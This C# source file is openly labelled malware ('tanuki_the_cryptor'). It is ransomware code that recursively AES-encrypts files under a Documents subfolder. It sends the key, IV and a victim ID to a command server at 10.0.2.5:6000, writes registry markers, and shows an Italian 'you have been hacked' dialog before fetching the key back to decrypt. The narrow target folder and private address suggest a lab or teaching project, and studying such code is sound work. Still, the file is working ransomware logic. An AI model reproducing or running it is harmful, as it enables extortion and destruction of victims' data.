using Microsoft.Win32;
using System.Security.Cryptography;
using System.Text;

namespace tanuki_the_cryptor
{
    public class Malware
    {
        private Mutex mutex = null;
        private string folder = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + "\\esempio";
        private Communication comm = null;
        private int RetryTimes = 3;
        private int WaitTime = 6000;

        public void Run()
        {
            const string appName = "malware";
            bool createdNew;

            mutex = new Mutex(true, appName, out createdNew);

            if (!createdNew)
            {
                Console.WriteLine(appName + " is already running! Exiting the application.\n\n");
                Console.ReadKey();
                return;
            }
            
            (byte[] key, byte[] iv, byte[] id) = (null, null, null);

            try
            {
                (id, bool encrypted) = Registers.GetEntriesValue();
     
                if(id == null || encrypted == false)
                {
                    (key, iv, id) = GenerateKey();
                    if ((key, iv, id) == (null, null, null)) return;

                    EncryptFiles(folder, key, iv);
                }

                (key, iv) = RetrieveKey(id);
                if ((key, iv) == (null, null)) return;

                DecryptFiles(folder, key, iv);

            }
            catch(Exception Ex)
            {
                Utility.ConsoleLog($"Execution failed: {Ex.Message}.");
                Utility.ConsoleLog($"Malware exit.");
            }
        }

        private (byte[], byte[], byte[]) GenerateKey()
        {
            for (int i = 0; i < RetryTimes; i++)
            {
                Utility.ConsoleLog($"Generation key try number {i}.\n");

                try
                {
                    Random rand = new Random();
                    byte[] key = null;
                    byte[] iv = null;

                    string id = "";

                    for (int j = 0; j < 10; j++)
                        id += Convert.ToChar(rand.Next(0, 26) + 65);

                    byte[] id_bytes = Encoding.UTF8.GetBytes(id);

                    using (Aes aes = Aes.Create())
                    {
                        key = aes.Key;
                        iv = aes.IV;
                    }

                    
                    Utility.ConsoleLog("Key generated.");

                    byte[] merge = new byte[key.Length + iv.Length];
                    Array.Copy(key, merge, key.Length);
                    Array.Copy(iv, 0, merge, key.Length, iv.Length);
                    byte[] hash_merge = Cryptography.GetHash(merge);

                    Utility.ConsoleLog("Key hashed.");
                    Utility.ConsoleLog("Sending key to server...");

                    comm = new Communication("10.0.2.5", 6000);
                    comm.Start();

                    comm.SendMessage(Cryptography.RSAEncrypt(Encoding.UTF8.GetBytes("store")));
                    Thread.Sleep(1000);
                    comm.SendMessage(Cryptography.RSAEncrypt(key));
                    Thread.Sleep(1000);
                    comm.SendMessage(Cryptography.RSAEncrypt(iv));
                    Thread.Sleep(1000);
                    comm.SendMessage(Cryptography.RSAEncrypt(id_bytes));
                    Thread.Sleep(1000);
                    comm.SendMessage(Cryptography.RSAEncrypt(hash_merge));

                    Utility.ConsoleLog("Key sent.");

                    byte[] resultStorage_bytes = comm.RecvMessage(256);
                    string resultStorage = Encoding.UTF8.GetString(Cryptography.RSADecrypt(resultStorage_bytes));
                    if (resultStorage == "keyFailure")
                    {
                        Utility.ConsoleLog("Recieved saving key failure from server.");

                        continue;
                    }
                    else if (resultStorage == "keySuccess")
                    {
                        Utility.ConsoleLog("Key saved.");

                        Registers.AddIdEntry(id_bytes);
                        return (key, iv, id_bytes);
                    }       
                }
                catch (Exception Ex)
                {
                    Utility.ConsoleLog($"Try {i} failed: {Ex.Message}.\n");

                    comm.Close();
                    Task.Delay(WaitTime).Wait();
                    continue;
                }
            }

            return (null, null, null);
        }

        static void EncryptFiles(string sourceFolder, byte[] key, byte[] iv)
        {
            Utility.ConsoleLog("Starting encryption...");

            try
            {
                if (!Directory.Exists(sourceFolder)) { return; }

                string[] files = Directory.GetFiles(sourceFolder);
                foreach (string file in files)
                {
                    Utility.ConsoleLog($"Encrypting {file}...");
                    byte[] content = File.ReadAllBytes(file);
                    byte[] encrypted = Cryptography.AESEncrypt(content, key, iv);
                    File.WriteAllBytes(file, encrypted);
                    Utility.ConsoleLog($"{file} encrypted.");
                }

                string[] folders = Directory.GetDirectories(sourceFolder);
                foreach (string folder in folders)
                {
                    EncryptFiles(folder, key, iv);
                }

                Registers.AddEncryptedEntry();
            }
            catch (Exception ex){ throw; }
        }

        private (byte[], byte[]) RetrieveKey(byte[] id_bytes)
        {
            DialogResult dialogResult = MessageBox.Show("Tutti i file contenuti nella cartella Documenti sono stati cifrati. Vuoi decifrarli?",
                "Sei stato hackerato", MessageBoxButtons.YesNo);
            if (dialogResult == DialogResult.Yes)
            {
                byte[] key = null;
                byte[] iv = null;
                byte[] hash = null;

                try
                {
                    for(int i = 0; i < RetryTimes; i++)
                    {
                        comm.SendMessage(Cryptography.RSAEncrypt(Encoding.UTF8.GetBytes("retrieve")));
                        Thread.Sleep(1000);
                        comm.SendMessage(Cryptography.RSAEncrypt(id_bytes));

                        key = Cryptography.RSADecrypt(comm.RecvMessage(256));
                        Utility.ConsoleLog("Key recv.");
                        Thread.Sleep(1000);
                        iv = Cryptography.RSADecrypt(comm.RecvMessage(256));
                        Utility.ConsoleLog("IV recv.");
                        Thread.Sleep(1000);
                        hash = Cryptography.RSADecrypt(comm.RecvMessage(256));
                        Utility.ConsoleLog("Hash recv.");

                        comm.Close();

                        return (key, iv);
                    }
                }
                catch (Exception ex)
                {
                    comm.Close();
                    throw;
                }
            }

            comm.Close();
            return (null, null);
        }

        private void DecryptFiles(string sourceFolder, byte[] key, byte[] iv)
        {
            Utility.ConsoleLog("Starting decryption...");
            if (!Directory.Exists(sourceFolder)) { return; }

            string[] files = Directory.GetFiles(sourceFolder);
            foreach (string file in files)
            {
                Utility.ConsoleLog($"Decrypting {file}...");
                byte[] content = File.ReadAllBytes(file);
                byte[] plainText = Cryptography.AESDecrypt(content, key, iv);
                File.WriteAllBytes(file, plainText);
                Utility.ConsoleLog($"{file} decrypted.");
            }

            string[] folders = Directory.GetDirectories(sourceFolder);
            foreach (string folder in folders)
            {
                DecryptFiles(folder, key, iv);
            }

            Registers.DeleteEntries();
        }
    }
}
